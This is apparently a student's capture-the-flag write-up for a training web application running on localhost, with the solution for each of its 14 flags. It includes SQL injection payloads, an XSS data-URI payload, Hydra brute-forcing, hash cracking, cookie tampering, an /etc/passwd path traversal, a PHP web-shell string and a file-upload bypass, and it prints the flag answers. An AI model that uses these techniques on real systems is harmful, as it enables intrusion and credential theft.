### This is a project that is meant as an intro to web security in the form of a CTF challenge where we need to find 14 flags

### Flag 00 03A944B434D5BAFF05F46C4BEDE5792551A2595574BCAFC9A6E25F67C382CCAA

The first vulnerability we found is the possibility to cheat very easily on a survey hosted on the website.
The server assumes the values as being from 1 to 10, but you can send the request with a much higher grade.

http://localhost:13080/?page=survey
Inspect option of Ben
Change value to 11 (negative didn't work)

### Flag 01 10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5

Search members page queries the database directly using SQL

vulnerable to sql injections we assume

5 UNION SELECT COUNT(_), NULL FROM users --
5 UNION SELECT COUNT(_), first_name FROM users --

this lists all table names

```
6 UNION SELECT NULL, table_name FROM information_schema.tables--
```

this lists all column names

```
6 UNION SELECT NULL, column_name FROM information_schema.columns--
```

this lists all columns of the table users, we're using hex because strings are being escaped

```
6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
```

listing all columns gave us this :

```
ID: 5 UNION SELECT NULL, column_name FROM information_schema.columns--
First name:
Surname : FLAG
```

which is sus

but after finding the table that this columbs belong to

```

ID: 5 UNION SELECT NULL, table_name FROM information_schema.columns WHERE column_name=0x464C4147--
First name:
Surname : INNODB_SYS_TABLES

```

and trying to get FLAG from it

```

5 UNION SELECT NULL, FLAG FROM INNODB_SYS_TABLES--

```

we get

```

Table 'Member_Sql_Injection.INNODB_SYS_TABLES' doesn't exist

```

seemingly it's a metadata table and flag is actually in the documentation as being "The flag field returns the dict_table_t::flags that correspond to the data dictionary record."

so wrong way

however we queried all columns from users

```
ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : town

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : country

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : planet

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : Commentaire

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : countersign
```

and after querying Commentaire & countersign we get

```
ID: 6 UNION SELECT Commentaire, countersign FROM users--
First name: Je pense, donc je suis
Surname : 2b3366bcfd44f540e630d4dc2b9b06d9

ID: 6 UNION SELECT Commentaire, countersign FROM users--
First name: Aamu on iltaa viisaampi.
Surname : 60e9032c586fb422e2c16dee6286cf10

ID: 6 UNION SELECT Commentaire, countersign FROM users--
First name: Dublin is a city of stories and secrets.
Surname : e083b24a01c483437bcf4a9eea7c1b4d

ID: 6 UNION SELECT Commentaire, countersign FROM users--
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

its MD5 again according to dcode

and after using john the ripper :

```
darklyProject git:(master) ✗ ../john/run/john --format=Raw-MD5 countersign
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=20
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 22 candidates buffered for the current salt, minimum 24 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2024-11-21 16:49) 0g/s 145600p/s 145600c/s 145600C/s Getflag1905..Getflag1900
Proceeding with wordlist:../john/run/password.lst
Enabling duplicate candidate password suppressor
Disabling duplicate candidate password suppressor
FortyTwo         (GetFlag)
1g 0:00:00:30 DONE 2/3 (2024-11-21 16:49) 0.03243g/s 14193Kp/s 14193Kc/s 14193KC/s NorwaY1..KushaL
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

now we we lower case to : fortytwo, encode it to sha256 as asked and tada : 10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5

### Flag 02 1D4855F7337C0C14B6F44946872C4EB33853F40B2D54393FBE94F49F1E19BBB0

http://localhost:13080/index.php?page=recover
when asking to recover the password, the form has a hidden field

```
<input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
```

Change webmaster@borntosec.com to whatever
1D4855F7337C0C14B6F44946872C4EB33853F40B2D54393FBE94F49F1E19BBB0

### Flag 03 0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E

Don't really get this one, just input 'a' as name and nothing as message and you get a flag

http://localhost:13080/index.php?page=feedback
Name: a
0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E

### Flag 04 f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

found this page by clicking on the very bottom of the screen on "© BornToSec"

Hashcrack this http://localhost:13080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f

might actually just be a flag in itself as it looks like SHA-256 as well but ????

seems like its domain xss or something there is a coucou function and modifying the dom through js

ok actually the hints were in form of HTML comments, namely :

```

Voila un peu de lecture :

Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.

Fun right ?
source: loem.
Good bye  !!!!

You must come from : "https://www.nsa.gov/".


Where does it come from?
Contrary to popular belief, Lorem Ipsum is not simply random text. It has roots in a piece of classical Latin literature from 45 BC, making it over 2000 years old. Richard McClintock, a Latin professor at Hampden-Sydney College in Virginia, looked up one of the more obscure Latin words, consectetur, from a Lorem Ipsum passage, and going through the cites of the word in classical literature, discovered the undoubtable source. Lorem Ipsum comes from sections 1.10.32 and 1.10.33 of "de Finibus Bonorum et Malorum" (The Extremes of Good and Evil) by Cicero, written in 45 BC. This book is a treatise on the theory of ethics, very popular during the Renaissance. The first line of Lorem Ipsum, "Lorem ipsum dolor sit amet..", comes from a line in section 1.10.32.

The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from "de Finibus Bonorum et Malorum" by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.

Let's use this browser : "ft_bornToSec". It will help you a lot.

```

there's two hints here, the comment "You must come from : "https://www.nsa.gov/"." is a reference to the referee
and the second hint "Let's use this browser : "ft_bornToSec". It will help you a lot." is a reference to the user agent

crafting the curl command and doing a diff :

```
➜  darklyProject git:(master) ✗ curl 'http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' --compressed -H 'User-Agent: ft_bornToSec' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Referer: https://www.nsa.gov/' -H 'Connection: keep-alive' -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Priority: u=0, i' > new.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2572    0  2572    0     0  2534k      0 --:--:-- --:--:-- --:--:-- 2511k
➜  darklyProject git:(master) ✗ diff og.txt new.txt
37c37
< <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
---
> <center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
```

### Flag 05 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d

a weirdly loaded image http://localhost:13080/index.php?page=media&src=1

after trying a million things

we can bypass the url encoding with base 64, and do an xss attack

```
➜  darklyProject git:(master) ✗ echo '<script>alert()</script>' | base64
PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+Cg==
```

this gives us a double wrong answer as http://localhost:8080/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+Cg==

but putting something in the alert

```
➜  darklyProject git:(master) ✗ echo '<script>alert("ok")</script>' | base64
PHNjcmlwdD5hbGVydCgib2siKTwvc2NyaXB0Pgo=
```

gets us the flag

```
 The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
```

### Flag 06 b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2

intuition is last flag is probably signin page
let's try and bruteforce the password
installed hydra locally

```
10191  ./configure --prefix=$HOME/hydra\n
10192  make
10193  make install prefix=$HOME/hydra\n
```

dont' forget to source the path .zshrc

```
➜  ~ hydra -L sgoinfre/SecLists/Usernames/top-usernames-shortlist.txt -P sgoinfre/SecLists/Passwords/2020-200_most_used_passwords.txt -s 8080 localhost http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif"
Hydra v9.6dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-29 13:40:25
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3349 login tries (l:17/p:197), ~210 tries per task
[DATA] attacking http-get-form://localhost:8080/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif
[8080][http-get-form] host: localhost   login: root   password: shadow
[8080][http-get-form] host: localhost   login: admin   password: shadow
[STATUS] 407.00 tries/min, 407 tries in 00:01h, 2942 to do in 00:08h, 16 active
[8080][http-get-form] host: localhost   login: test   password: shadow
[8080][http-get-form] host: localhost   login: guest   password: shadow
[8080][http-get-form] host: localhost   login: info   password: shadow
[8080][http-get-form] host: localhost   login: adm   password: shadow
[STATUS] 400.33 tries/min, 1201 tries in 00:03h, 2148 to do in 00:06h, 16 active
[8080][http-get-form] host: localhost   login: mysql   password: shadow
[8080][http-get-form] host: localhost   login: user   password: shadow
[8080][http-get-form] host: localhost   login: administrator   password: shadow
[8080][http-get-form] host: localhost   login: oracle   password: shadow
[8080][http-get-form] host: localhost   login: ftp   password: shadow
[8080][http-get-form] host: localhost   login: pi   password: shadow
[8080][http-get-form] host: localhost   login: puppet   password: shadow
[8080][http-get-form] host: localhost   login: ansible   password: shadow
[STATUS] 397.57 tries/min, 2783 tries in 00:07h, 566 to do in 00:02h, 16 active
[8080][http-get-form] host: localhost   login: ec2-user   password: shadow
[8080][http-get-form] host: localhost   login: vagrant   password: shadow
[STATUS] 397.38 tries/min, 3179 tries in 00:08h, 170 to do in 00:01h, 16 active
[8080][http-get-form] host: localhost   login: azureuser   password: shadow
1 of 1 target successfully completed, 17 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-29 13:48:49
```

not very secure hm, using any user with shadow as password leads to : "The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 " !

### Flag 07 df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3

cookie I_am_admin

cookie value is "68934a3e9455fa72420237eb05902327"
suspiciously looks like MD5 again

and lo and behold

```

../john/run/john --format=Raw-MD5 i_am_admin_cookie
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=20
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 19 candidates buffered for the current salt, minimum 24 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2024-11-21 17:25) 0g/s 102000p/s 102000c/s 102000C/s Cookie1921..Cookie1900
Proceeding with wordlist:../john/run/password.lst
Enabling duplicate candidate password suppressor
false (cookie)
1g 0:00:00:00 DONE 2/3 (2024-11-21 17:25) 7.692g/s 3206Kp/s 3206Kc/s 3206KC/s leticia22..qwzxas
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.

```

so the cookie value is false

replacing it with true in md5 and clicking on home

and we get

```

Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3

```

### Flag 08 d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff

found this dir using gobuster

http://localhost:8080/whatever/

there is a htpasswd file containing

```

`root:437394baff5aa33daa618be47b75cb49`

```

Seems to be hashed in md5, we cracked the password using John the Ripper:

```bash
../john/run/john --format=Raw-MD5 htpasswd
```

gives us the password

```
Enabling duplicate candidate password suppressor
qwerty123@       (root)
```

so now we can connect to this page which we also found through gobuster

http://localhost:8080/admin/

using root as username and qwerty123@ as password, which gets us the flag

### FLAG 09 b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 LOCAL FILE INCLUSION

http://localhost:8080/index.php?page=../../../../etc/passwd

ALMOST

http://localhost:8080/index.php?page=../../../../../var/log/httpd/access.log

STILL NOPE

and a bunch more until

http://localhost:8080/index.php?page=../../../../../../../etc/passwd

which gives us

```
Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
```

### FLAG 10 F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188

SEARCH IMAGE, IMAGE NUMBER 5

comes up to

```
ID: 5
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

going for sql injections : 5 OR 1=1--
gives

```
ID: 5 OR 1=1--
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 5 OR 1=1--
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42

ID: 5 OR 1=1--
Title: Google
Url : https://fr.wikipedia.org/wiki/Logo_de_Go

ID: 5 OR 1=1--
Title: Earth
Url : https://en.wikipedia.org/wiki/Earth#/med

ID: 5 OR 1=1--
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

vulnerable to sql injections even though it doesnt return errors

this gives us what tables we have access to

```
ID: -1 UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=DATABASE()--
Title: list_images
Url :
```

which is list_images

listing the values in list_images

```
ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: id
Url :

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: url
Url :

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: title
Url :

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: comment
Url :
```

we see an interesting thing, the comment

and fetching the values gives us

```
ID: 6 UNION SELECT title, comment FROM list_images--
Title: An image about the NSA !
Url : Nsa

ID: 6 UNION SELECT title, comment FROM list_images--
Title: There is a number..
Url : 42 !

ID: 6 UNION SELECT title, comment FROM list_images--
Title: Google it !
Url : Google

ID: 6 UNION SELECT title, comment FROM list_images--
Title: Earth!
Url : Earth

ID: 6 UNION SELECT title, comment FROM list_images--
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

using john

```
darklyProject git:(master) ✗ ../john/run/john --format=Raw-MD5 comment
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=20
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 22 candidates buffered for the current salt, minimum 24 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2024-11-26 19:24) 0g/s 8564p/s 8564c/s 8564C/s Getflag1905..Getflag1900
Proceeding with wordlist:../john/run/password.lst
Enabling duplicate candidate password suppressor
albatroz         (GetFlag)
1g 0:00:00:00 DONE 2/3 (2024-11-26 19:24) 2.703g/s 645318p/s 645318c/s 645318C/s billy420..sylveste
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

albatroz to sha256 gives us : F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188

### FLAG 11 b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3

there is a bunch of redirect links at the bottom to twitter, instagram and so on

we can just modify the query from

```
http://localhost:8080/index.php?page=redirect&site=instagram
```

to anything

```
http://localhost:8080/index.php?page=redirect&site=ifoundavulnerability
```

and we get a flag

## FLAG 12 d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466

gobuster gave us robots.txt
which says to hid /whatever (already got the flag there) and /.hidden

there is a bunch of files and dir in /.hidden

tried to see if there was any meaning to the names of the dir and files but nothing
all files have a readme which taunts us like "Try again"

so we need to make a crawler, which we do and search for keyword flag and it works the first time, we could also have just removed all the few special messages
in the other readmes, or search by size but flag works

and we get

```
Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
```

in http://localhost:8080/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README

## FLAG 13 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8 SERVER SIDE VALIDATION

ADD IMAGE page

after trying a bunch of things, we can see that the server accepts .jpg files

and returns for example

```
/tmp/test.jpg succesfully uploaded.
```

however the image is not in the db we have access to through search img, not in the front page, there isn't a tmp dir we can reach
we also can't use local file inclusion to reach it

so even though the .jpg can technically be a script we could run there is nowhere we can reach it

however when uploading

```
<?php system($_GET['cmd']); ?>.jpg
```

we get back

```
/tmp/.jpg succesfully uploaded.
```

but that was not the vulnerability that we were supposed to find,

this works though

```
➜  darklyProject git:(master) ✗ curl -X POST 'http://localhost:8080/index.php?page=upload#' \
-H 'Content-Type: multipart/form-data' \
-F 'uploaded=@test.php;type=image/jpeg' \
-F 'MAX_FILE_SIZE=100000' \
-F 'Upload=Upload'
```

basically just sending the POST request with a .php file but setting the type as jpeg

and we get

```
>The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/test.php succesfully uploaded.</pre>
```

### TO NOTE

➜ utenret gobuster dir -u http://localhost:8080/ -w KaliLists/dirb/big.txt -b 200,975

```
➜  darklyProject git:(master) ✗ gobuster dir -u http://localhost:8080/ -w ../KaliLists/dirb/big.txt --exclude-length 975

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ../KaliLists/dirb/big.txt
[+] Negative Status codes:   404
[+] Exclude Length:          975
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 193] [--> http://localhost/admin/]
/audio                (Status: 301) [Size: 193] [--> http://localhost/audio/]
/css                  (Status: 301) [Size: 193] [--> http://localhost/css/]
/errors               (Status: 301) [Size: 193] [--> http://localhost/errors/]
/favicon.ico          (Status: 200) [Size: 1406]
/fonts                (Status: 301) [Size: 193] [--> http://localhost/fonts/]
/images               (Status: 301) [Size: 193] [--> http://localhost/images/]
/includes             (Status: 301) [Size: 193] [--> http://localhost/includes/]
/js                   (Status: 301) [Size: 193] [--> http://localhost/js/]
/robots.txt           (Status: 200) [Size: 53]
/whatever             (Status: 301) [Size: 193] [--> http://localhost/whatever/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================

```

```
darklyProject git:(master) ✗ gobuster dir -u http://localhost:8080/images/ -w ../KaliLists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,png,gif --exclude-length 975

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:8080/images/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ../KaliLists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          975
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,png,gif
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/search.png           (Status: 200) [Size: 49089]
/banner.jpg           (Status: 200) [Size: 511270]
/upload.png           (Status: 200) [Size: 64785]
/win.png              (Status: 200) [Size: 72726]
/win.jpg              (Status: 200) [Size: 43468]
/banner2.jpg          (Status: 200) [Size: 50867]
/404.jpg              (Status: 200) [Size: 27027]
/banner1.jpg          (Status: 200) [Size: 391182]
/nsa.png              (Status: 200) [Size: 133243]
/mailbox.png          (Status: 200) [Size: 49480]
/marvin.jpg           (Status: 200) [Size: 111300]
/search_img.png       (Status: 200) [Size: 17185]
/whoami.gif           (Status: 200) [Size: 1809804]
Progress: 830572 / 830576 (100.00%)
===============================================================
Finished
===============================================================
```
